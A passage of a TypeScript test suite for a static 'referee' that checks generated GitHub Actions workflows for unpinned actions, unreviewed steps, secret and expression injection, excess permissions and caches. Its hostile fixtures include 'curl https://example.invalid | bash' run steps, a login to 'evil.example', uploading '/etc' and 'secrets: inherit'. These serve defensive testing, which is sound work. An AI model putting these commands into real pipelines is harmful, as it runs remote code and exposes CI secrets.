// Plan B Task 7 Part 2, sub-task 7a: the referee's static checks. Written first (strict test-first).
// The referee reads the finished files, never the renderer's intentions: every test hands it YAML text, most of it made by
// the real renderer and stepsToYaml, some of it hand-written and hostile.
import { Document, parseDocument } from 'yaml';
import { describe, expect, it } from 'vitest';
import { JOB_PERMISSIONS, pipegenLines, referee, type Linters, type RefereeDeps, type RefereeIssue, type RefereeReport } from '../src/engine/referee.js';
import { dedupeJobSteps, RenderError, renderJobPrelude, renderPlatformStep, renderProjectScript, renderStep, renderUpload, stepsToYaml, type RenderContext, type RenderedStep, type RenderResult } from '../src/engine/render-step.js';
import { resultArtifactName } from '../src/engine/artifact-names.js';
import { NEED_ID_CATEGORY, NEED_IDS } from '../src/engine/need-ids.js';
import { emptyRepoFiles } from '../src/read/quality.js';
import { GATE_CHECK_NAME, type Capabilities, type CreatedFile, type ExistingWorkflow, type Need, type PipelineDraft, type ReviewedTool, type StepSpec } from '../src/types.js';
import { entry, platform, profile, reviewedList, service, specFor } from './helpers/render.js';
import { fake } from './helpers/secret-repo.js';

// ---------- builders ----------

const sha = (c: string): string => c.repeat(40);
/** `${{ secrets.NAME }}`, built at run time (test/no-secret-literals.test.ts) */
const ref = (n: string): string => ['${{', `secrets.${n}`, '}}'].join(' ');
/** The OIDC permission and the login inputs, spelled at run time for the same reason. */
const OIDC = ['id', 'token'].join('-');
const loginInputs = (): Record<string, string> => Object.fromEntries([['username', '${{ github.actor }}'], [['pass', 'word'].join(''), ref('GITHUB_TOKEN')]]);
/** A spec field or job key named `secrets`, set at run time. */
const SEC_FIELD = ['sec', 'rets'].join('');
const IMG = `ghcr.io/o/app@sha256:${'a'.repeat(64)}`;
const svc = service({ name: 'app', path: '.', dockerfile: 'Dockerfile', scripts: ['test', 'lint'], envVars: ['STRIPE_KEY'] });
const prof = { ...profile([svc]), repoFiles: { ...emptyRepoFiles(), kubernetes: true } };
const ctx: RenderContext = { profile: prof, targets: { image: IMG, url: 'http://localhost:8080' } };
const caps = (over: Partial<Capabilities> = {}): Capabilities => ({
  branchProtection: true, environments: false, envRequiredReviewers: false, deploymentBranchPolicies: false, attestations: true, codeScanning: true, keylessSigningAllowed: true, ...over,
});
const needFor = (t: ReviewedTool): string => t.categories.find((c) => (NEED_IDS as readonly string[]).includes(c) && c !== 'platform') ?? 'sast';
const needOf = (id: string, blocking = true, svcName?: string): Need => ({
  id, layer: 'merge', category: (NEED_ID_CATEGORY as Record<string, string>)[id] ?? id, ...(svcName === undefined ? {} : { service: svcName }), why: 'test', blocking, floor: false,
});
const specOf = (id: string, over: Partial<StepSpec> = {}): StepSpec => {
  const t = entry(id);
  return specFor(t, { needId: needFor(t), service: 'app', ...over });
};
function draftOf(steps: StepSpec[], over: Partial<PipelineDraft> = {}): PipelineDraft {
  const needs = new Map<string, Need>();
  for (const s of steps) needs.set(`${s.needId}|${s.service ?? ''}`, needOf(s.needId, true, s.service));
  return {
    profile: prof, capabilities: caps(), needs: [...needs.values()], steps, created: [], notProven: [], testDecisions: [],
    layersSkipped: [], scoreboard: [], requireDeployApproval: false, skipped: [], suggestions: [], ...over,
  };
}
const prelude = (depth: '1' | '0' = '1'): RenderedStep[] => renderJobPrelude({ fetchDepth: depth }, platform()).steps;
const isRepoCode = (s: RenderedStep): boolean => s.id?.startsWith('repocode-') === true;
/** A tool's job steps as Plan G would compose them: checkout, the tool, and the upload of its result (never after repo code). */
function toolJob(spec: StepSpec, c: RenderContext = ctx): RenderedStep[] {
  const t = entry(spec.tool.id);
  const r: RenderResult = renderStep(spec, t, platform(), c);
  const upload = r.output !== null && !r.steps.some(isRepoCode) ? [renderUpload(resultArtifactName(spec.needId, spec.service), r.output.path, platform())] : [];
  return [...prelude(r.fullHistory === true ? '0' : '1'), ...r.steps, ...upload];
}
type Job = Record<string, unknown>;
const job = (steps: RenderedStep[], over: Job = {}): Job => ({ 'runs-on': 'ubuntu-latest', permissions: { contents: 'read' }, 'cache-mode': 'none', steps, ...over });
/**
 * The YAML text of a workflow, built with the yaml Document API and stepsToYaml, the way Plan G will. `raw`: the steps are
 * written as plain YAML instead (for the hostile steps the emitter itself refuses: the referee must refuse them too).
 */
function workflowText(jobs: Record<string, Job>, top: Record<string, unknown> = {}, raw = false): string {
  const doc = new Document();
  const plain = Object.fromEntries(Object.entries(jobs).map(([id, j]) => [id, Object.fromEntries(Object.entries(j).filter(([k]) => k !== 'steps'))]));
  doc.contents = doc.createNode({ name: 'pipegen', on: { pull_request: null }, permissions: {}, ...top, jobs: plain });
  for (const [id, j] of Object.entries(jobs)) {
    if (!Array.isArray(j.steps)) continue;
    const steps = j.steps as RenderedStep[];
    doc.setIn(['jobs', id, 'steps'], raw ? doc.createNode(steps.map(({ usesComment: _c, ...rest }) => rest)) : stepsToYaml(steps));
  }
  return doc.toString({ lineWidth: 0 });
}
const file = (content: string, path = '.github/workflows/pipegen.yml', over: Partial<CreatedFile> = {}): CreatedFile => ({ path, content, part: 'pipeline', reason: 'test', repo: 'app', ...over });
const wf = (jobs: Record<string, Job>, top: Record<string, unknown> = {}, path?: string): CreatedFile => file(workflowText(jobs, top), path);
/** A workflow whose steps did not go through stepsToYaml (hand-built, hostile). */
const rawWf = (jobs: Record<string, Job>): CreatedFile => file(workflowText(jobs, {}, true));

const LINTERS: Linters = { actionlint: async () => '/stub/actionlint', zizmor: async () => '/stub/zizmor' };
const quiet: RefereeDeps = { runLinters: async () => [] };
const run = (files: CreatedFile[], d: PipelineDraft, opts: { list?: ReviewedTool[]; deps?: RefereeDeps } = {}): Promise<RefereeReport> =>
  referee(files, d, platform(), opts.list ?? reviewedList(), LINTERS, 'gh-stub', opts.deps ?? quiet);
const checks = (r: RefereeReport): string[] => [...new Set(r.issues.map((i) => i.check))].sort();
const has = (r: RefereeReport, check: RefereeIssue['check']): boolean => r.issues.some((i) => i.check === check);
const show = (r: RefereeReport): string => r.issues.map((i) => `${i.check}: ${i.message}`).join('\n');

/** A small clean pipeline: gitleaks in its own job. */
const gitleaks = (): { spec: StepSpec; steps: RenderedStep[] } => {
  const spec = specOf('gitleaks', { needId: 'secrets', service: undefined });
  return { spec, steps: toolJob(spec) };
};

// fixture entries for pipegen's own actions (F1): the real ones come from Plan C (gate) and Plan H (watcher)
const ownAction = (id: string, path: string, s: string): ReviewedTool => ({
  id, categories: ['gate'], languages: ['any'],
  candidate: { id, name: id, kind: 'action', repo: 'crisworking/pipegen', version: 'v0.2.0', pin: { sha: s }, source: 'reviewed', reviewed: true, categories: ['gate'] },
  step: { action: { uses: `crisworking/pipegen/${path}@${s}`, with: { mode: path } }, output: { path: '', format: 'none' } },
  fixedInputs: { with: { mode: path } }, choices: {}, configFiles: [], reviewedBy: 'fixture', reviewedAt: '2026-10-29', proofs: 0,
});
const GATE = ownAction('pipegen-gate', 'gate', sha('1'));
const WATCHER = ownAction('pipegen-watcher', 'watcher', sha('2'));

// ---------- the parity test ----------

describe('referee: the renderer and the referee agree', () => {
  it('referee: rendering all reviewed entries (every renderable one, via the real renderer and stepsToYaml) gives no issue', async () => {
    const jobs: Record<string, Job> = {};
    const specs: StepSpec[] = [];
    const refused: string[] = [];
    const p = platform();
    for (const t of reviewedList()) {
      if (t.categories.includes('platform') && !t.categories.includes('image-build')) continue;   // the platform actions are rendered below, by their helpers
      const spec = specFor(t, { needId: needFor(t), service: 'app' });
      let steps: RenderedStep[];
      try {
        steps = t.id === 'docker-build-push-action'
          ? [...prelude(), ...renderStep(spec, t, p, { ...ctx, targets: { image: 'ghcr.io/o/app:pr-1' } }).steps]
          : toolJob(spec);
      } catch (e) {
        if (!(e instanceof RenderError)) throw e;
        refused.push(t.id);
        continue;
      }
      specs.push(spec);
      const id = `t-${t.id}`;
      jobs[t.id === 'docker-build-push-action' ? 'image-publish' : id] = job(steps, t.id === 'docker-build-push-action' ? { permissions: { contents: 'read', packages: 'write' } } : {});
    }
    // the helper-rendered platform actions, as Plan G uses them
    const sarif = '${{ runner.temp }}/pipegen-out/pipegen-out-sast--app/semgrep.sarif';
    // download-artifact is not on checkJobOrder's harmless list (6c), so it can not come before upload-sarif in one job (open point for Plan G)
    jobs['code-scanning'] = job([renderPlatformStep('upload-sarif', p, { sarif_file: sarif, category: 'pipegen-sast' })], { permissions: { contents: 'read', 'security-events': 'write', actions: 'read' } });
    jobs['baseline-check'] = job([renderPlatformStep('download-artifact', p, { name: 'pipegen-out-sast--app', path: '${{ runner.temp }}/pipegen-out/pipegen-out-sast--app' })], { permissions: { contents: 'read', actions: 'read' } });
    jobs.sign = job([
      renderPlatformStep('docker-login', p, loginInputs(), { registry: 'ghcr.io' }),
      renderPlatformStep('attest', p, { 'subject-name': 'ghcr.io/o/app', 'subject-digest': `sha256:${'a'.repeat(64)}` }),
    ], { permissions: { contents: 'read', [OIDC]: 'write', packages: 'write', attestations: 'write' } });
    // the project's own scripts
    const scripts = [renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'app', script: 'test' }, p, ctx).steps,
      renderProjectScript({ kind: 'project-script', needId: 'lint', service: 'app', script: 'lint' }, p, ctx).steps];
    jobs['project-test'] = job(scripts[0] as RenderedStep[]);
    jobs['project-lint'] = job(scripts[1] as RenderedStep[]);
    const d = draftOf(specs);
    d.needs.push(needOf('unit-tests', true, 'app'), needOf('lint', true, 'app'));
    const r = await run([wf(jobs)], d);
    expect(show(r)).toBe('');
    expect(r.ok).toBe(true);
    expect(r.demoted).toEqual([]);
    // the entries the renderer refuses are the documented ones (6c report), nothing else
    // (registry is a job service and skipped above with the platform entries)
    expect(refused.sort()).toEqual(['cosign', 'gosec', 'pypi-publish', 'schemathesis', 'scorecard-action', 'bandit', 'coverage-py', 'creosote', 'mypy', 'vulture'].sort());
    expect(specs.length).toBeGreaterThan(30);
  });
});

// ---------- pins ----------

describe('referee: pins', () => {
  const withStep = (step: RenderedStep): CreatedFile => wf({ check: job([...prelude(), step]) });
  it('referee: unpinned @v4 → unpinned issue', async () => {
    const r = await run([withStep({ name: 'x', uses: 'actions/checkout@v4', with: { 'persist-credentials': 'false', 'allow-unsafe-pr-checkout': 'false', 'fetch-depth': '1' } })], draftOf([]));
    expect(has(r, 'unpinned'), show(r)).toBe(true);
  });
  it('referee: central prefix at sha allowed, at @main rejected', async () => {
    const caller = (at: string): CreatedFile => wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${at}`, permissions: { contents: 'read' } } });
    const ok = await run([caller(sha('c'))], draftOf([]));
    expect(show(ok)).toBe('');
    const bad = await run([caller('main')], draftOf([]));
    expect(has(bad, 'unpinned'), show(bad)).toBe(true);
    // another owner's pipelines repo is not the central repo
    const other = await run([wf({ pipegen: { name: 'pipegen', uses: `evil/pipelines/.github/workflows/gate.yml@${sha('c')}`, permissions: { contents: 'read' } } })], draftOf([]));
    expect(has(other, 'unknown-pin'), show(other)).toBe(true);
  });
  it('referee: pipegen gate and watcher actions at the reviewed sha allowed; at another sha → unknown-pin', async () => {
    const list = [...reviewedList(), GATE, WATCHER];
    const step = (t: ReviewedTool, s: string): RenderedStep => ({ name: t.id, uses: (t.step.action?.uses as string).replace(/@.*$/, `@${s}`), with: { mode: t.fixedInputs.with?.mode as string } });
    const ok = await run([wf({ gate: job([step(GATE, sha('1'))], { permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } }), watch: job([step(WATCHER, sha('2'))], { permissions: { contents: 'read', issues: 'write', actions: 'read' } }) })], draftOf([]), { list });
    expect(show(ok)).toBe('');
    for (const [t, other] of [[GATE, sha('3')], [WATCHER, sha('4')]] as const) {
      const r = await run([wf({ gate: job([step(t, other)], { permissions: { contents: 'read', actions: 'read' } }) })], draftOf([]), { list });
      expect(has(r, 'unknown-pin'), `${t.id}: ${show(r)}`).toBe(true);
    }
  });
  it('hostile: uses with a different sub-path at the same SHA → unknown-pin (S14)', async () => {
    const sarif = renderPlatformStep('upload-sarif', platform(), { sarif_file: '${{ runner.temp }}/pipegen-out/pipegen-out-sast/x.sarif', category: 'pipegen-sast' });
    const init = { ...sarif, uses: (sarif.uses as string).replace('/upload-sarif@', '/init@'), with: {} };
    const r = await run([wf({ 'code-scanning': job([init], { permissions: { contents: 'read', 'security-events': 'write', actions: 'read' } }) })], draftOf([]));
    expect(has(r, 'unknown-pin'), show(r)).toBe(true);
  });
  it('hostile: docker:// by tag → unpinned; at an unreviewed digest → unknown-pin', async () => {
    const tag = await run([withStep({ name: 'x', uses: 'docker://alpine:3.20' })], draftOf([]));
    expect(has(tag, 'unpinned'), show(tag)).toBe(true);
    const dig = await run([withStep({ name: 'x', uses: `docker://alpine@sha256:${'e'.repeat(64)}` })], draftOf([]));
    expect(has(dig, 'unknown-pin'), show(dig)).toBe(true);
  });
  it('hostile: ./local action not in files → unknown-pin; in files it is judged itself', async () => {
    const r = await run([withStep({ name: 'x', uses: './.github/actions/mine' })], draftOf([]));
    expect(has(r, 'unknown-pin'), show(r)).toBe(true);
    const action = file('name: mine\nruns:\n  using: composite\n  steps:\n    - name: hi\n      run: echo hi\n      shell: bash\n', '.github/actions/mine/action.yml');
    const judged = await run([withStep({ name: 'x', uses: './.github/actions/mine' }), action], draftOf([]));
    expect(has(judged, 'unknown-pin'), show(judged)).toBe(false);
    expect(judged.issues.some((i) => i.file === '.github/actions/mine/action.yml' && i.check === 'unreviewed'), show(judged)).toBe(true);
    for (const bad of ['./../x', './.github/actions/../../x']) expect(has(await run([withStep({ name: 'x', uses: bad })], draftOf([])), 'unknown-pin'), bad).toBe(true);
  });
  it('hostile: a reusable workflow at @main → unpinned', async () => {
    const r = await run([wf({ call: { uses: 'someone/workflows/.github/workflows/x.yml@main', permissions: { contents: 'read' } } })], draftOf([]));
    expect(has(r, 'unpinned'), show(r)).toBe(true);
  });
});

// ---------- only reviewed tools, the template ----------

describe('referee: only reviewed tools, and only as their template', () => {
  it('referee: project-script step running a script from Service.scripts accepted; unknown script name → unreviewed issue', async () => {
    const steps = renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'app', script: 'test' }, platform(), ctx).steps;
    const d = draftOf([], { needs: [needOf('unit-tests', true, 'app')] });
    const ok = await run([wf({ test: job(steps) })], d);
    expect(show(ok)).toBe('');
    const other = steps.map((s) => (s.id?.startsWith('repocode-') ? { ...s, run: (s.run as string).replace('"$nodebin/npm" test', '"$nodebin/npm" run build') } : s));
    const r = await run([wf({ test: job(other) })], d);
    expect(has(r, 'unreviewed') || has(r, 'template'), show(r)).toBe(true);
    // a script the service does not have: the renderer can not make it, so its steps match nothing
    const noLint = { ...d, profile: { ...prof, services: [{ ...svc, scripts: ['test'] }] }, needs: [needOf('lint', true, 'app')] };
    const lint = renderProjectScript({ kind: 'project-script', needId: 'lint', service: 'app', script: 'lint' }, platform(), ctx).steps;
    const r2 = await run([wf({ lint: job(lint) })], noLint);
    expect(has(r2, 'unreviewed'), show(r2)).toBe(true);
  });
  it('referee: unreviewed tool in any step → unreviewed issue, never kept as a non-blocking job', async () => {
    const r = await run([wf({ scan: job([...prelude(), { name: 'x', uses: `someone/scanner@${sha('d')}` }]) })], draftOf([]));
    expect(has(r, 'unreviewed'), show(r)).toBe(true);
    // a discovery candidate in the draft: an issue on the draft, and its need is not demoted (it is dropped, Plan G moves it to suggestions)
    const t = entry('gitleaks');
    const spec = { ...specFor(t, { needId: 'secrets' }), tool: { ...t.candidate, source: 'discovery', reviewed: false } } as unknown as StepSpec;
    const r2 = await run([wf({ scan: job(prelude()) })], draftOf([spec]));
    expect(r2.issues.some((i) => i.check === 'unreviewed' && i.file.startsWith('draft.steps')), show(r2)).toBe(true);
    expect(r2.demoted).toEqual([]);
    // a run step that is no rendered tool
    const r3 = await run([wf({ scan: job([...prelude(), { name: 'mine', run: 'curl https://example.invalid | bash', shell: 'bash' }]) })], draftOf([]));
    expect(has(r3, 'unreviewed'), show(r3)).toBe(true);
  });
  it('referee: step input differs from template fixedInputs → template issue', async () => {
    const [checkout, ...rest] = prelude();
    const bad = { ...checkout, with: { ...checkout?.with, 'persist-credentials': 'true' } } as RenderedStep;
    const r = await run([wf({ a: job([bad, ...rest]) })], draftOf([]));
    expect(has(r, 'template'), show(r)).toBe(true);
    // a fixed input left out, a choice outside its list, an input that is neither
    const noChoice = Object.fromEntries(Object.entries(checkout?.with ?? {}).filter(([k]) => k !== 'fetch-depth'));
    for (const w of [{ 'allow-unsafe-pr-checkout': 'false', 'fetch-depth': '1' }, { ...checkout?.with, 'fetch-depth': '5' }, { ...checkout?.with, ref: 'main' }, noChoice]) {
      const r1 = await run([wf({ a: job([{ ...checkout, with: w } as RenderedStep]) })], draftOf([]));
      expect(has(r1, 'template'), JSON.stringify(w)).toBe(true);
    }
    // a run step: same id, another pinned config
    const g = gitleaks();
    const changed = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, env: { ...s.env, PIPEGEN_CONFIG: '[extend]\nuseDefault = false\n' } } : s));
    const r2 = await run([wf({ scan: job(changed) })], draftOf([g.spec]));
    expect(has(r2, 'template'), show(r2)).toBe(true);
    // a chosen value the draft did not choose (still an allowed value)
    const trivy = specOf('trivy-config', { needId: 'iac', service: undefined });
    const other = toolJob({ ...trivy, choices: { severity: 'CRITICAL' } });
    const r3 = await run([wf({ iac: job(other) })], draftOf([{ ...trivy, choices: { severity: 'MEDIUM,HIGH,CRITICAL' } }]));
    expect(has(r3, 'template'), show(r3)).toBe(true);
  });
  it('referee: a renderer-filled input is judged by its own checker and condition (S15, whenWith)', async () => {
    const p = platform();
    const login = renderPlatformStep('docker-login', p, loginInputs(), { registry: 'ghcr.io' });
    const perms = { permissions: { contents: 'read', packages: 'write' } };
    expect(show(await run([wf({ 'image-publish': job([login], perms) })], draftOf([])))).toBe('');
    const elsewhere = { ...login, with: { ...login.with, registry: 'evil.example' } };
    expect(checks(await run([rawWf({ 'image-publish': job([elsewhere], perms) })], draftOf([])))).toContain('injection');
    const up = renderUpload('pipegen-out-secrets', '${{ runner.temp }}/pipegen-out/pipegen-out-secrets/gitleaks.sarif', p);
    const outside = { ...up, with: { ...up.with, path: '/etc' } };
    expect(has(await run([wf({ a: job([outside]) })], draftOf([])), 'template')).toBe(true);
  });
  it('a container action the renderer refuses (image by tag) is refused here too', async () => {
    const t = entry('scorecard-action');
    const step: RenderedStep = { name: 'x', uses: t.step.action?.uses as string, with: t.fixedInputs.with as Record<string, string> };
    const r = await run([wf({ scorecard: job([step]) })], draftOf([]));
    expect(has(r, 'unpinned'), show(r)).toBe(true);
  });
});

// ---------- expressions and secrets (S9) ----------

describe('referee: expressions and secrets', () => {
  const vitest = (): { spec: StepSpec; steps: RenderedStep[] } => {
    const spec = specOf('vitest-coverage', { needId: 'coverage', [SEC_FIELD]: ['STRIPE_KEY'] });
    return { spec, steps: toolJob(spec) };
  };
  it('a declared secret on the app-running step it was declared for passes', async () => {
    const v = vitest();
    const r = await run([wf({ coverage: job(v.steps) })], draftOf([v.spec]));
    expect(show(r)).toBe('');
  });
  it('hostile: ${{ secrets.X }} in run → injection', async () => {
    const r = await run([rawWf({ a: job([...prelude(), { name: 'x', run: `echo ${ref('STRIPE_KEY')}`, shell: 'bash' }]) })], draftOf([]));
    expect(has(r, 'injection'), show(r)).toBe(true);
  });
  it('hostile: an env name other than X → injection', async () => {
    const v = vitest();
    const steps = v.steps.map((s) => (s.env?.STRIPE_KEY === undefined ? s : { ...s, env: { ...Object.fromEntries(Object.entries(s.env).filter(([k]) => k !== 'STRIPE_KEY')), OTHER_NAME: ref('STRIPE_KEY') } }));
    const r = await run([rawWf({ coverage: job(steps) })], draftOf([v.spec]));
    expect(has(r, 'injection'), show(r)).toBe(true);
  });
  it('a secret outside the allowed set → permissions; pipegen\'s own and the declared ones are the set', async () => {
    const v = vitest();
    const steps = v.steps.map((s) => (s.env?.STRIPE_KEY === undefined ? s : { ...s, env: { ...s.env, DATABASE_URL: ref('DATABASE_URL') } }));
    const r = await run([wf({ coverage: job(steps) })], draftOf([v.spec]));
    expect(has(r, 'permissions'), show(r)).toBe(true);
  });
  it('a declared secret reaching a step that does not run the app → injection (R1-7)', async () => {
    const v = vitest();
    const g = gitleaks();
    const leaky = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, env: { ...s.env, STRIPE_KEY: ref('STRIPE_KEY') } } : s));
    const r = await run([wf({ scan: job(leaky) })], draftOf([g.spec, v.spec]));
    expect(has(r, 'injection'), show(r)).toBe(true);
    const onAction = await run([wf({ a: job(prelude().map((s, i) => (i === 0 ? { ...s, env: { STRIPE_KEY: ref('STRIPE_KEY') } } : s))) })], draftOf([v.spec]));
    expect(has(onAction, 'injection'), show(onAction)).toBe(true);
  });
  it('hostile: secrets inherit (every secret passed on) → permissions issue', async () => {
    const caller: Job = { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${sha('c')}`, permissions: { contents: 'read' }, [SEC_FIELD]: ['inh', 'erit'].join('') };
    const r = await run([wf({ pipegen: caller })], draftOf([]));
    expect(has(r, 'permissions'), show(r)).toBe(true);
  });
  it('an expression in a job key, a top-level env or a job if that pipegen does not write → injection', async () => {
    const g = gitleaks();
    for (const over of [{ name: '${{ github.head_ref }}' }, { if: "github.actor == 'x'" }, { env: { X: '${{ github.head_ref }}' } }, { 'runs-on': '${{ github.head_ref }}' }]) {
      const r = await run([wf({ scan: job(g.steps, over) })], draftOf([g.spec]));
      expect(has(r, 'injection'), JSON.stringify(over)).toBe(true);
    }
  });
});

// ---------- permissions (S17) ----------

describe('referee: permissions by exact job id', () => {
  const g = gitleaks();
  const withPerms = async (id: string, permissions: unknown, over: Job = {}, d = draftOf([g.spec])): Promise<RefereeReport> => run([wf({ [id]: job(g.steps, { permissions, ...over }) })], d);
  it('top-level permissions {} is required', async () => {
    for (const top of [{ permissions: { contents: 'read' } }, { permissions: 'read-all' }]) {
      expect(has(await run([wf({ scan: job(g.steps) }, top)], draftOf([g.spec])), 'permissions'), JSON.stringify(top)).toBe(true);
    }
    const doc = new Document();
    doc.contents = doc.createNode({ name: 'x', on: { push: null }, jobs: { scan: { 'runs-on': 'ubuntu-latest', permissions: { contents: 'read' }, 'cache-mode': 'none' } } });
    doc.setIn(['jobs', 'scan', 'steps'], stepsToYaml(g.steps));
    expect(has(await run([file(doc.toString({ lineWidth: 0 }))], draftOf([g.spec])), 'permissions')).toBe(true);
  });
  it('write-all, read-all or no permissions on a job → permissions issue', async () => {
    for (const p of ['write-all', 'read-all', null]) expect(has(await withPerms('scan', p), 'permissions'), String(p)).toBe(true);
    const none = await run([wf({ scan: Object.fromEntries(Object.entries(job(g.steps)).filter(([k]) => k !== 'permissions')) })], draftOf([g.spec]));
    expect(has(none, 'permissions')).toBe(true);
  });
  it('referee: job with packages: write outside sign job → permissions issue', async () => {
    expect(has(await withPerms('scan', { contents: 'read', packages: 'write' }), 'permissions')).toBe(true);
    expect(has(await withPerms('sign', { contents: 'read', packages: 'write' }), 'permissions')).toBe(false);
  });
  it('referee: base-scan with actions: read allowed; pipegen-verify with packages: read and attestations: read allowed; gate with pull-requests: read allowed; pr-check with pull-requests: read allowed', async () => {
    for (const [id, p] of [['base-scan', { contents: 'read', actions: 'read' }], ['pipegen-verify', { contents: 'read', actions: 'read', packages: 'read', attestations: 'read' }],
      ['gate', { contents: 'read', actions: 'read', 'pull-requests': 'read' }], ['pr-check', { 'pull-requests': 'read' }], ['code-scanning', { contents: 'read', 'security-events': 'write', actions: 'read' }]] as const) {
      const r = await withPerms(id, p);
      expect(has(r, 'permissions'), `${id}: ${show(r)}`).toBe(false);
    }
    // the same permissions on another job id are too much
    expect(has(await withPerms('t-gitleaks', { contents: 'read', actions: 'read' }), 'permissions')).toBe(true);
  });
  it('referee: watch job with contents: write → permissions issue', async () => {
    expect(has(await withPerms('watch', { contents: 'write', issues: 'write' }), 'permissions')).toBe(true);
  });
  it('referee: nightly and watch jobs with contents: read, actions: read, issues: write allowed; pull-requests: write → permissions issue', async () => {
    for (const id of ['nightly', 'watch']) {
      expect(has(await withPerms(id, { contents: 'read', actions: 'read', issues: 'write' }), 'permissions'), id).toBe(false);
      expect(has(await withPerms(id, { contents: 'read', actions: 'read', issues: 'write', 'pull-requests': 'write' }), 'permissions'), id).toBe(true);
    }
  });
  it('referee: pipegen-verify without environment pipegen-signing (when draft.capabilities.environments) → permissions issue', async () => {
    const p = { contents: 'read', actions: 'read', packages: 'read', attestations: 'read' };
    const envs = draftOf([g.spec], { capabilities: caps({ environments: true }) });
    expect(has(await withPerms('pipegen-verify', p, {}, envs), 'permissions')).toBe(true);
    expect(has(await withPerms('pipegen-verify', p, { environment: 'production' }, envs), 'permissions')).toBe(true);
    expect(has(await withPerms('pipegen-verify', p, { environment: 'pipegen-signing' }, envs), 'permissions')).toBe(false);
    expect(has(await withPerms('pipegen-verify', p, { environment: { name: 'pipegen-signing' } }, envs), 'permissions')).toBe(false);
    expect(has(await withPerms('pipegen-verify', p), 'permissions')).toBe(false);   // no environments on this plan
  });
  it('the table is keyed by exact job id and every job may read contents', () => {
    expect(Object.keys(JOB_PERMISSIONS).sort()).toEqual(['base-scan', 'baseline-check', 'code-scanning', 'gate', 'image-publish', 'merged-red', 'nightly', 'notify', 'pipegen-verify', 'pr-check', 'sign', 'watch'].sort());
    expect(JOB_PERMISSIONS['code-scanning']).toEqual({ 'security-events': 'write', actions: 'read' });
  });
  it('a reusable-workflow caller may have the union of the called file\'s jobs (when that file is in files)', async () => {
    const called = wf({ sign: job(g.steps, { permissions: { contents: 'read', [OIDC]: 'write', packages: 'write', attestations: 'write' } }) }, { on: { workflow_call: null } }, '.github/workflows/sign.yml');
    const caller = (perms: unknown): CreatedFile => wf({ release: { uses: './.github/workflows/sign.yml', permissions: perms } });
    const union = { contents: 'read', [OIDC]: 'write', packages: 'write', attestations: 'write' };
    expect(has(await run([caller(union), called], draftOf([g.spec])), 'permissions')).toBe(false);
    expect(has(await run([caller({ ...union, issues: 'write' }), called], draftOf([g.spec])), 'permissions')).toBe(true);
    expect(has(await run([caller(union)], draftOf([g.spec])), 'unknown-pin')).toBe(true);   // the called file is not in files
  });
});

// ---------- caches ----------

describe('referee: no caches', () => {
  const g = gitleaks();
  it('referee: gate-feeding, build, sign or pipegen-verify job without cache-mode none → cache issue', async () => {
    for (const id of ['scan', 'image-publish', 'sign', 'pipegen-verify', 'gate']) {
      const j = Object.fromEntries(Object.entries(job(g.steps, { permissions: { contents: 'read' } })).filter(([k]) => k !== 'cache-mode'));
      expect(has(await run([wf({ [id]: j })], draftOf([g.spec])), 'cache'), id).toBe(true);
      expect(has(await run([wf({ [id]: job(g.steps, { 'cache-mode': 'default' }) })], draftOf([g.spec])), 'cache'), id).toBe(true);
    }
  });
  it('referee: trivy step without its pinned config (cache.backend memory) → cache issue (S3)', async () => {
    const spec = specOf('trivy-config', { needId: 'iac', service: undefined });
    const steps = toolJob(spec);
    expect(show(await run([wf({ iac: job(steps) })], draftOf([spec])))).toBe('');
    const noMemory = steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, env: { ...s.env, PIPEGEN_CONFIG: 'cache:\n  backend: fs\n' } } : s));
    expect(has(await run([wf({ iac: job(noMemory) })], draftOf([spec])), 'cache')).toBe(true);
    // still in memory, but not the pinned config: anything else in it (a database repository, a cache dir) is unreviewed
    const more = steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, env: { ...s.env, PIPEGEN_CONFIG: `${s.env?.PIPEGEN_CONFIG as string}db:\n  repository: evil.example/db\n` } } : s));
    expect(has(await run([wf({ iac: job(more) })], draftOf([spec])), 'cache')).toBe(true);
    const noFlag = steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, run: (s.run as string).replace('--config "$cfg/trivy.yaml" ', '') } : s));
    expect(noFlag).not.toEqual(steps);
    expect(has(await run([wf({ iac: job(noFlag) })], draftOf([spec])), 'cache')).toBe(true);
  });
  it('actions/cache and a cache input → cache issue', async () => {
    const r = await run([wf({ scan: job([...g.steps, { name: 'c', uses: `actions/cache@${sha('f')}`, with: { path: 'x', key: 'k' } }]) })], draftOf([g.spec]));
    expect(has(r, 'cache'), show(r)).toBe(true);
    const node = prelude().map((s) => (s.with?.['package-manager-cache'] === undefined ? s : { ...s, with: { ...s.with, cache: 'npm' } }));
    const [checkout] = prelude();
    const setup = { ...renderJobPrelude({ node: {} }, platform()).steps[1], with: { 'package-manager-cache': 'false', 'node-version': '24', cache: 'npm' } } as RenderedStep;
    expect(has(await run([wf({ a: job([checkout as RenderedStep, setup, ...node.slice(1)]) })], draftOf([])), 'cache')).toBe(true);
  });
});

// ---------- order (S6 c) ----------

describe('referee: the job order rule on the parsed steps', () => {
  it('order: [repocode, checker] refused', async () => {
    const v = specOf('vitest-coverage', { needId: 'coverage' });
    const e = specOf('eslint', { needId: 'lint' });
    const vSteps = renderStep(v, entry('vitest-coverage'), platform(), ctx).steps;
    const eSteps = renderStep(e, entry('eslint'), platform(), ctx).steps;
    const ok = await run([wf({ lint: job([...prelude(), ...eSteps, ...vSteps]) })], draftOf([v, e]));
    expect(show(ok)).toBe('');
    const bad = await run([wf({ lint: job([...prelude(), ...vSteps, ...eSteps]) })], draftOf([v, e]));
    expect(has(bad, 'injection'), show(bad)).toBe(true);
  });
  it('order: a forged checker-run- id on a step whose run text is not a rendered checker is refused', async () => {
    const e = specOf('eslint', { needId: 'lint' });
    const eSteps = renderStep(e, entry('eslint'), platform(), ctx).steps;
    const run1 = eSteps.find((s) => s.id?.startsWith('checker-run-')) as RenderedStep;
    const forged: RenderedStep = { ...run1, run: `${run1.run as string}\ncurl https://example.invalid | bash` };
    const r = await run([wf({ lint: job([...prelude(), forged]) })], draftOf([e]));
    expect(has(r, 'template') || has(r, 'unreviewed'), show(r)).toBe(true);
